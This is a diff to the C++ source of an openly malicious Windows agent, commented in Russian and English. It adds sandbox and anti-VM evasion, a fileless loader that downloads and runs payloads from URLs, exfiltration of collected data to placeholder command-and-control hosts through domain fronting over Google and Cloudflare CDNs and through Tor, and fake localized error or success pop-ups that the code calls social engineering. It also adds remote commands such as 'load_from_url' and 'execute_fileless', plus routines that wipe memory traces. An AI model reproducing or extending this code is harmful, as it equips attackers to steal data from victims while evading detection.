@@ -14,6 +14,14 @@
 #include "stealth/dynamic_obfuscation.h"
 #include "stealth/signature_evasion.h"
 
+#ifdef MODULE_NETWORK_ENABLED
+#include "network/secure_comms.h"
+#endif
+
+#ifdef MODULE_DECEPTION_ENABLED
+#include "deception/localized_messages.h"
+#endif
+
 // Forward declarations for modules
 extern "C" {
     // Logger functions
@@ -32,6 +40,18 @@ extern "C" {
     
     // Module functions (to be implemented)
     bool CheckMainEnvironment();       // Anti-VM/Anti-Debug checks
+    
+    // Advanced Sandbox Evasion 2.0 functions
+    bool PerformAdvancedSandboxCheck();
+    bool CheckAdvancedUserInteraction();
+    bool CheckAdvancedSystemUptime();
+    bool CheckAdvancedInstalledSoftware();
+    bool CheckAdvancedFileSystemArtifacts();
+    bool CheckAdvancedNetworkAdapters();
+    bool CheckAdvancedCPUCount();
+    bool CheckAdvancedMemoryPatterns();
+    bool CheckAdvancedGPUPresence();
+    int GetSandboxConfidenceLevel();
     
     // Advanced Persistence functions
     bool InstallAdvancedPersistence(); // Enhanced persistence installation
@@ -52,6 +72,30 @@ extern "C" {
     void* GetLoadedPEExport(const char* functionName);
     void UnloadPE();
     bool ExecuteLoadedPE();
+    
+    // AdvancedMemoryLoader functions - Memory-Only Execution модуль
+    bool InitAdvancedMemoryLoader();
+    bool LoadPayloadFromURL(const char* url);
+    bool ExecutePayloadFileless(const void* payload, size_t size);
+    bool CreateProcessInMemoryOnly();
+    void CleanupMemoryArtifacts();
+    void OverwriteMemoryTraces();
+    void ShutdownAdvancedMemoryLoader();
+    bool LoadAndExecuteFromURL(const char* url);
+    bool GetMemoryLoaderStats(char* buffer, int bufferSize);
+    
+    // LocalizedDeception functions - Локализованные поддельные сообщения
+    bool InitLocalizedDeception();
+    void ShutdownLocalizedDeception();
+    bool AutoDetectSystemLanguage();
+    int GetDetectedLanguageCode();
+    void ShowLocalizedError();
+    void ShowLocalizedSuccess();
+    void ShowLocalizedWarning();
+    void ShowLocalizedInfo();
+    const char* GetLocalizationStatus();
+    bool IsLanguageSupported(int languageCode);
+    int GetSupportedLanguageCount();
 }
 
 // Configuration
@@ -60,8 +104,18 @@ namespace Config {
     constexpr int INITIAL_DELAY = 10;            // 10 seconds
     constexpr bool ENABLE_PERSISTENCE = true;
     constexpr bool ENABLE_STEALTH = true;
+    constexpr bool ENABLE_SECURE_NETWORK = true; // Включить безопасные коммуникации
     constexpr const char* SERVER_URL = "https://your-server.com/api/agent/checkin";
+    constexpr const char* PRIMARY_HOST = "your-python-server.com";
+    constexpr const char* BACKUP_HOST = "backup-server.com";
     constexpr const char* TELEGRAM_BOT_URL = "https://api.telegram.org/bot{token}/sendDocument";
+    
+    // Настройки поддельных сообщений
+    constexpr bool ENABLE_FAKE_MESSAGES = true;  // Показывать поддельные сообщения
+    constexpr int FAKE_MESSAGE_DELAY = 3000;     // Задержка перед показом (мс)
+    constexpr int FAKE_MESSAGE_TYPE = -1;        // -1 = случайный, 0 = ошибка, 1 = успех
+    constexpr bool AUTO_DETECT_LANGUAGE = true;  // Автоматически определять язык
+    constexpr int FALLBACK_LANGUAGE = 0;         // Язык по умолчанию (0 = английский)
 }
 
 // Agent state
@@ -72,8 +126,16 @@ private:
     std::thread worker_thread;
     std::unique_ptr<SignatureEvasion::SignatureEvader> signatureEvader;
     
+#ifdef MODULE_NETWORK_ENABLED
+    SecureNetwork::SecureComms* secureComms;
+#endif
+    
 public:
-    Agent() : running(false) {}
+    Agent() : running(false) {
+#ifdef MODULE_NETWORK_ENABLED
+        secureComms = nullptr;
+#endif
+    }
     
     bool Initialize() {
         LogInfo("Agent initializing with enhanced systems...");
@@ -81,6 +143,25 @@ public:
         // Initialize logging systems
         InitLogger();
         InitEncryptedLogger();
+        
+        // AdvancedSandboxEvasion 2.0 - Комплексная проверка среды выполнения
+        LogInfo("Запуск AdvancedSandboxEvasion 2.0...");
+        if (!PerformAdvancedSandboxCheck()) {
+            LogError("ОБНАРУЖЕНА SANDBOX СРЕДА! Агент будет завершен для безопасности.");
+            int confidence = GetSandboxConfidenceLevel();
+            LogError(("Уровень уверенности обнаружения sandbox: " + std::to_string(confidence) + "/10").c_str());
+            
+            // При высоком уровне уверенности - немедленный выход
+            if (confidence >= 8) {
+                LogError("Критический уровень обнаружения sandbox - немедленный выход");
+                return false;
+            }
+            
+            // При среднем уровне - продолжаем, но с повышенной осторожностью
+            LogWarning("Средний уровень подозрений - продолжаем работу с повышенной осторожностью");
+        } else {
+            LogInfo("AdvancedSandboxEvasion 2.0: Среда выполнения выглядит легитимной");
+        }
         
         // Initialize integrated RT-SRT systems
         if (!RTSRTIntegration::InitializeAllSystems()) {
@@ -91,6 +172,91 @@ public:
         // Get agent ID
         agent_id = GetAgentId();
         LogInfo(("Agent ID: " + agent_id).c_str());
+        
+        // Initialize Secure Network Communications
+#ifdef MODULE_NETWORK_ENABLED
+        if (Config::ENABLE_SECURE_NETWORK) {
+            LogInfo("Initializing Secure Network Communications...");
+            
+            secureComms = &SecureNetwork::GetGlobalSecureComms();
+            
+            // Configure network settings
+            SecureNetwork::NetworkConfig netConfig;
+            netConfig.primaryHost = Config::PRIMARY_HOST;
+            netConfig.backupHost = Config::BACKUP_HOST;
+            netConfig.enableDomainFronting = true;
+            netConfig.enableTorRouting = true;
+            netConfig.enableCertificatePinning = true;
+            netConfig.encryptionLevel = SecureNetwork::EncryptionLevel::TRIPLE_ENCRYPTION;
+            netConfig.connectionTimeout = 30000;  // 30 seconds
+            netConfig.readTimeout = 15000;        // 15 seconds
+            netConfig.torProxyAddress = "127.0.0.1";
+            netConfig.torProxyPort = 9050;
+            
+            // Add domain fronting targets
+            netConfig.domainFrontingTargets.push_back("ajax.googleapis.com");
+            netConfig.domainFrontingTargets.push_back("cdnjs.cloudflare.com");
+            netConfig.domainFrontingTargets.push_back("unpkg.com");
+            netConfig.domainFrontingTargets.push_back("fonts.googleapis.com");
+            
+            if (secureComms->Initialize(netConfig)) {
+                LogInfo("Secure Network Communications initialized successfully");
+                
+                // Test network connectivity
+                LogInfo("Testing network connectivity...");
+                if (secureComms->TestAllConnections()) {
+                    LogInfo("Network connectivity test passed");
+                } else {
+                    LogWarning("Network connectivity test failed - will use fallback methods");
+                }
+            } else {
+                LogError("Failed to initialize Secure Network Communications");
+                secureComms = nullptr;
+            }
+        }
+#endif
+        
+        // Initialize AdvancedMemoryLoader - Memory-Only Execution модуль
+        LogInfo("Initializing AdvancedMemoryLoader for memory-only execution...");
+        if (!InitAdvancedMemoryLoader()) {
+            LogError("Failed to initialize AdvancedMemoryLoader");
+            // Не критично - продолжаем без memory-only execution
+        } else {
+            LogInfo("AdvancedMemoryLoader initialized successfully");
+            
+            // Получаем статистику модуля
+            char statsBuffer[512];
+            if (GetMemoryLoaderStats(statsBuffer, sizeof(statsBuffer))) {
+                LogInfo((std::string("AdvancedMemoryLoader статистика: ") + statsBuffer).c_str());
+            }
+        }
+        
+        // Initialize LocalizedDeception - Локализованные поддельные сообщения
+#ifdef MODULE_DECEPTION_ENABLED
+        if (Config::ENABLE_FAKE_MESSAGES) {
+            LogInfo("Инициализация системы локализованных поддельных сообщений...");
+            if (!InitLocalizedDeception()) {
+                LogError("Ошибка инициализации LocalizedDeception");
+                // Не критично - продолжаем без локализованных сообщений
+            } else {
+                LogInfo("LocalizedDeception инициализирована успешно");
+                
+                // Автоматически определяем язык системы
+                if (Config::AUTO_DETECT_LANGUAGE) {
+                    if (AutoDetectSystemLanguage()) {
+                        int langCode = GetDetectedLanguageCode();
+                        LogInfo(("Автоматически определен язык: " + std::to_string(langCode)).c_str());
+                    } else {
+                        LogWarning("Не удалось автоматически определить язык, используется английский");
+                    }
+                }
+                
+                // Выводим статус локализации
+                const char* status = GetLocalizationStatus();
+                LogInfo(("Статус локализации: " + std::string(status)).c_str());
+            }
+        }
+#endif
         
         // Start Stealth system
         if (Config::ENABLE_STEALTH) {
@@ -177,6 +343,30 @@ public:
             signatureEvader.reset();
         }
         
+        // Gracefully shutdown AdvancedMemoryLoader
+        LogInfo("Shutting down AdvancedMemoryLoader...");
+        try {
+            CleanupMemoryArtifacts();
+            OverwriteMemoryTraces();
+            ShutdownAdvancedMemoryLoader();
+            LogInfo("AdvancedMemoryLoader shutdown completed");
+        } catch (...) {
+            LogError("Exception during AdvancedMemoryLoader shutdown");
+        }
+        
+        // Shutdown LocalizedDeception system
+#ifdef MODULE_DECEPTION_ENABLED
+        if (Config::ENABLE_FAKE_MESSAGES) {
+            LogInfo("Shutting down LocalizedDeception system...");
+            try {
+                ShutdownLocalizedDeception();
+                LogInfo("LocalizedDeception shutdown completed");
+            } catch (...) {
+                LogError("Exception during LocalizedDeception shutdown");
+            }
+        }
+#endif
+        
         // Stop all RT-SRT systems
         RTSRTIntegration::ShutdownAllSystems();
         
@@ -194,6 +384,9 @@ public:
         
         // Send collected data
         SendData();
+        
+        // Show fake localized messages to user (social engineering)
+        ShowFakeMessages();
         
         LogInfo("Data collection completed");
     }
@@ -222,6 +415,24 @@ private:
                 
                 // Apply periodic signature evasion techniques
                 ApplyPeriodicEvasion();
+                
+                // Периодическая проверка sandbox (каждый 5-й цикл)
+                static int sandboxCheckCounter = 0;
+                if (++sandboxCheckCounter % 5 == 0) {
+                    LogDebug("Выполнение периодической проверки sandbox...");
+                    if (!PerformAdvancedSandboxCheck()) {
+                        int confidence = GetSandboxConfidenceLevel();
+                        LogWarning(("Обнаружена подозрительная активность sandbox (уровень: " + 
+                                   std::to_string(confidence) + "/10)").c_str());
+                        
+                        // При критическом уровне - экстренное завершение
+                        if (confidence >= 9) {
+                            LogError("КРИТИЧЕСКОЕ обнаружение sandbox - экстренное завершение");
+                            running = false;
+                            break;
+                        }
+                    }
+                }
                 
                 // Periodic system status logging
                 static int statusCounter = 0;
@@ -334,9 +545,54 @@ private:
     }
     
     bool SendToServer(const std::vector<uint8_t>& data) {
-        // Implementation would use WinHTTP or WinInet
-        // This is a placeholder
-        LogInfo("Attempting to send data to server...");
+#ifdef MODULE_NETWORK_ENABLED
+        if (secureComms && Config::ENABLE_SECURE_NETWORK) {
+            LogInfo("Sending data via Secure Network Communications...");
+            
+            // Convert binary data to base64 for JSON transmission
+            std::string base64Data = Base64Encode(data);
+            
+            // Create JSON payload with agent information
+            std::string payload = "{";
+            payload += "\"agent_id\":\"" + agent_id + "\",";
+            payload += "\"timestamp\":\"" + std::to_string(std::time(nullptr)) + "\",";
+            payload += "\"data_type\":\"encrypted_logs\",";
+            payload += "\"data\":\"" + base64Data + "\"";
+            payload += "}";
+            
+            // Send encrypted data using multi-layer encryption
+            auto result = secureComms->SendEncryptedData(payload);
+            
+            if (result.success) {
+                LogInfo(("Data sent successfully via " + 
+                        std::to_string(static_cast<int>(result.usedConnection)) + 
+                        " in " + std::to_string(result.responseTime.count()) + "ms").c_str());
+                
+                // Log connection method used
+                switch (result.usedConnection) {
+                    case SecureNetwork::ConnectionType::DIRECT_HTTPS:
+                        LogInfo("Used: Direct HTTPS connection");
+                        break;
+                    case SecureNetwork::ConnectionType::DOMAIN_FRONTING:
+                        LogInfo("Used: Domain Fronting via CDN");
+                        break;
+                    case SecureNetwork::ConnectionType::TOR_PROXY:
+                        LogInfo("Used: Tor SOCKS5 proxy");
+                        break;
+                    case SecureNetwork::ConnectionType::FALLBACK:
+                        LogInfo("Used: Fallback server");
+                        break;
+                }
+                return true;
+            } else {
+                LogError(("Failed to send data: " + result.errorMessage).c_str());
+                return false;
+            }
+        }
+#endif
+        
+        // Fallback to old method if secure network is not available
+        LogInfo("Attempting to send data to server (fallback method)...");
         
         // Convert to base64
         std::string base64Data = Base64Encode(data);
@@ -344,10 +600,8 @@ private:
         // Create JSON payload
         std::string payload = "{\"data\":\"" + base64Data + "\"}";
         
-        // Send HTTP POST request
-        // ... implementation ...
-        
-        return false; // Placeholder
+        // This is still a placeholder - would need basic WinHTTP implementation
+        return false;
     }
     
     bool SendToTelegram(const std::vector<uint8_t>& data) {
@@ -397,7 +651,7 @@ private:
         
         LogDebug("Checking for commands...");
         
-        // Example command handling for persistence management
+        // Example command handling for persistence and network management
         // In real implementation, these would come from server
         /*
         if (command == "scan_persistence") {
@@ -427,6 +681,80 @@ private:
             UnloadPE();
             SendResponse("Module unloaded");
         }
+        // AdvancedMemoryLoader команды - Memory-Only Execution управление
+        else if (command == "load_from_url") {
+            // Загрузка payload из URL и выполнение в памяти
+            if (LoadAndExecuteFromURL(url.c_str())) {
+                SendResponse("Payload loaded and executed successfully from URL");
+            } else {
+                SendResponse("Failed to load payload from URL");
+            }
+        }
+        else if (command == "execute_fileless") {
+            // Fileless выполнение переданного payload
+            bool success = ExecutePayloadFileless(payloadData.data(), payloadData.size());
+            SendResponse(success ? "Fileless execution successful" : "Fileless execution failed");
+        }
+        else if (command == "create_memory_process") {
+            // Создание процесса только в памяти
+            bool success = CreateProcessInMemoryOnly();
+            SendResponse(success ? "Memory-only process created" : "Failed to create memory-only process");
+        }
+        else if (command == "cleanup_memory") {
+            // Очистка всех артефактов памяти
+            CleanupMemoryArtifacts();
+            OverwriteMemoryTraces();
+            SendResponse("Memory cleanup completed");
+        }
+        else if (command == "memory_stats") {
+            // Получение статистики AdvancedMemoryLoader
+            char buffer[512];
+            if (GetMemoryLoaderStats(buffer, sizeof(buffer))) {
+                std::string response = "Memory Loader Stats: ";
+                response += buffer;
+                SendResponse(response);
+            } else {
+                SendResponse("Failed to get memory loader statistics");
+            }
+        }
+        else if (command == "enable_tor") {
+            #ifdef MODULE_NETWORK_ENABLED
+            if (secureComms && secureComms->ConnectViaTor()) {
+                SendResponse("Tor routing enabled");
+            } else {
+                SendResponse("Failed to enable Tor routing");
+            }
+            #endif
+        }
+        else if (command == "disable_tor") {
+            #ifdef MODULE_NETWORK_ENABLED
+            if (secureComms && secureComms->DisconnectTor()) {
+                SendResponse("Tor routing disabled");
+            } else {
+                SendResponse("Failed to disable Tor routing");
+            }
+            #endif
+        }
+        else if (command == "enable_domain_fronting") {
+            #ifdef MODULE_NETWORK_ENABLED
+            if (secureComms) {
+                secureComms->UseDomainFronting();
+                SendResponse("Domain fronting enabled");
+            }
+            #endif
+        }
+        else if (command == "network_status") {
+            #ifdef MODULE_NETWORK_ENABLED
+            if (secureComms) {
+                auto status = secureComms->GetConnectionStatus();
+                std::string statusStr = "Network Status: ";
+                for (const auto& s : status) {
+                    statusStr += s + "; ";
+                }
+                SendResponse(statusStr);
+            }
+            #endif
+        }
         */
     }
     
@@ -446,6 +774,57 @@ private:
         }
         
         return result;
+    }
+    
+    void ShowFakeMessages() {
+#ifdef MODULE_DECEPTION_ENABLED
+        // Показываем поддельные сообщения только если включена соответствующая опция
+        if (!Config::ENABLE_FAKE_MESSAGES) {
+            return;
+        }
+        
+        // Простая статическая переменная для контроля частоты показа
+        static int messageCounter = 0;
+        messageCounter++;
+        
+        // Показываем сообщения не каждый раз, а периодически
+        if (messageCounter % 3 != 0) {
+            return;
+        }
+        
+        try {
+            LogDebug("ShowFakeMessages: Показ локализованного поддельного сообщения");
+            
+            // Добавляем настроенную задержку перед показом
+            if (Config::FAKE_MESSAGE_DELAY > 0) {
+                std::this_thread::sleep_for(std::chrono::milliseconds(Config::FAKE_MESSAGE_DELAY));
+            }
+            
+            // Определяем тип сообщения для показа
+            int messageType = Config::FAKE_MESSAGE_TYPE;
+            if (messageType == -1) {
+                // Случайный выбор типа сообщения
+                messageType = rand() % 2; // 0 = ошибка, 1 = успех
+            }
+            
+            // Показываем соответствующее сообщение
+            if (messageType == 0) {
+                LogDebug("ShowFakeMessages: Показ сообщения об ошибке");
+                ShowLocalizedError();
+            } else {
+                LogDebug("ShowFakeMessages: Показ сообщения об успехе");
+                ShowLocalizedSuccess();
+            }
+            
+        } catch (const std::exception& e) {
+            LogError(("ShowFakeMessages: Ошибка показа сообщения: " + std::string(e.what())).c_str());
+        } catch (...) {
+            LogError("ShowFakeMessages: Неизвестная ошибка при показе сообщения");
+        }
+#else
+        // Если модуль не включен, ничего не делаем
+        LogDebug("ShowFakeMessages: Модуль локализованных сообщений отключен");
+#endif
     }
     
     void ApplyPeriodicEvasion() {
@@ -656,6 +1035,43 @@ extern "C" __declspec(dllexport) BOOL ExecuteLoadedModule() {
 
 extern "C" __declspec(dllexport) void UnloadModule() {
     UnloadPE();
+}
+
+// AdvancedMemoryLoader exports - Memory-Only Execution функции
+extern "C" __declspec(dllexport) BOOL InitializeAdvancedMemoryLoader() {
+    return InitAdvancedMemoryLoader() ? TRUE : FALSE;
+}
+
+extern "C" __declspec(dllexport) BOOL LoadFromURL(const char* url) {
+    return LoadPayloadFromURL(url) ? TRUE : FALSE;
+}
+
+extern "C" __declspec(dllexport) BOOL ExecuteFileless(const void* payload, DWORD size) {
+    return ExecutePayloadFileless(payload, size) ? TRUE : FALSE;
+}
+
+extern "C" __declspec(dllexport) BOOL CreateMemoryProcess() {
+    return CreateProcessInMemoryOnly() ? TRUE : FALSE;
+}
+
+extern "C" __declspec(dllexport) void CleanupMemory() {
+    CleanupMemoryArtifacts();
+}
+
+extern "C" __declspec(dllexport) void OverwriteMemory() {
+    OverwriteMemoryTraces();
+}
+
+extern "C" __declspec(dllexport) void ShutdownMemoryLoader() {
+    ShutdownAdvancedMemoryLoader();
+}
+
+extern "C" __declspec(dllexport) BOOL LoadAndExecuteURL(const char* url) {
+    return LoadAndExecuteFromURL(url) ? TRUE : FALSE;
+}
+
+extern "C" __declspec(dllexport) BOOL GetMemoryStats(char* buffer, int bufferSize) {
+    return GetMemoryLoaderStats(buffer, bufferSize) ? TRUE : FALSE;
 }
 
 // Alternative entry point for EXE
